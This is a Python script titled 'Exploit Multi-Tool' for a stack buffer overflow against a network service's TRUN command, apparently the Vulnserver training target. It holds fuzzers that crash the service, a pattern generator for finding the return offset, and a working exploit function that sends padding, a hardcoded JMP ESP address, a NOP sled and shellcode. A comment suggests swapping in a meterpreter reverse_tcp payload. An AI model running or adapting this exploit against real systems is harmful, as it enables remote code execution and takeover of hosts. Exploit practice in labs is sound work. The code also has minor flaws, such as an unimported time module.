"""
Exploit Multi-Tool
@autho rcrypt0sploit
"""

import socket
import sys 
#import exploit_patterns 
import shellcode
import struct
import os
from pattern import *

class exploit:
    def __init__(self, host, port, length):
        self.host = host
        self.port = port
        self.length = length

    def fuzzer1(self):
        
        buffer = "\x41"*self.length + '\x42'*4

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((self.host, int(self.port)))
            s.recv(1024)                            # You need to change these lines
            s.send('TRUN .' + buffer + '\r\n')         # of code specificaly s.send()
            s.recv(1024)
            time.sleep(2)
            print("Sending to buffer " + str(len(buffer)) + ' bytes.')
        except:
            print("Possible crash or could not connect to target !")
            sys.exit()        

    def fuzzer(self):

        buffer = 'A'*self.length

        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((self.host, int(self.port)))
                s.recv(1024)                        # You need to change these lines
                s.send('TRUN .' + buffer + '\n')     # of code specificaly s.send()
                s.recv(1024)
                print("Sending to buffer " + str(len(buffer)) + ' bytes.')
                s.close()
                buffer += '\x41'*self.length
            except:
                print('Possible crash with buffer length of ' + str(len(buffer)))
                sys.exit()
      
    def pattern_fuzz(self):

        buffer = pattern_gen(self.length)

        try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.settimeout(2)
		s.connect((self.host, int(self.port)))
		s.recv(1024)
		s.send('TRUN .' + buffer + '\r\n')
		s.recv(1024)
		time.sleep(2)
		print("Sending to buffer " + str(len(buffer)) + " bytes.")
        except:
		print("Possible crash or could not connect to target !")
		sys.exit()

    def poc(self):

        #esp = 0x76a64ebf                 # add here the jmp esp address

        # Change inside shellcode.py the shellcode
        # to the one you desire ( msfvenom -p windows/meterpreter/reverse_tcp )
        # default shellcode - calc.exe
        # 311712F3   . FFE4           JMP ESP
        
        esp = 0x311712f3
        buffer = '\x41'*self.length
        buffer += struct.pack('<L', esp)
        buffer += '\x90'*30
        buffer += shellcode.buf
        #buffer += '\x42'*(1050-230-4-15-len(shellcode.buf))

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((self.host, int(self.port)))
            s.recv(1024)                              # You need to change these lines
            s.send('TRUN .' + buffer + '\n')         # of code specificaly s.send()
            s.recv(1024)
            time.sleep(2)
            print("Sending to buffer " + str(len(buffer)) + ' bytes.')
        except:
            print("Possible crash or could not connect to target !")
            sys.exit()

def main():
    try:
        if str(sys.argv[1]) == "-e":
            execute = exploit(sys.argv[2], sys.argv[3], int(sys.argv[4]))
            execute.poc()
        elif str(sys.argv[1]) == "-f":
            execute = exploit(sys.argv[2], sys.argv[3], int(sys.argv[4]))
            execute.fuzzer()
        elif str(sys.argv[1]) == "-F":
            execute = exploit(sys.argv[2], sys.argv[3], int(sys.argv[4]))
            execute.fuzzer1()
        elif str(sys.argv[1]) == "-p":
            execute = exploit(sys.argv[2], sys.argv[3], int(sys.argv[4]))
            execute.pattern_fuzz()

    except IndexError:
        print("\nUsage: python exploit_v2.py [-f/-F/-e] [host] [port] [length]"+'\n')
        print("\t-f   Fuzzer for fuzzing the target ( find the vulnerability ).")
        print("\t-F   Fuzzer for fuzzing the target ( instant crash )")
        print("\t-e   Exploit the target.")
        print("\t-p   Fuzzer with pattern for Finding the return address\n")
        print("When using '-f', 'length' must be 50 because it multiplies the buffer.")
        print("When using '-e','-p','-F' 'length' must be the ammount of data that takes to perform segmentation fault."+'\n\n')



if __name__ == "__main__":
    main()
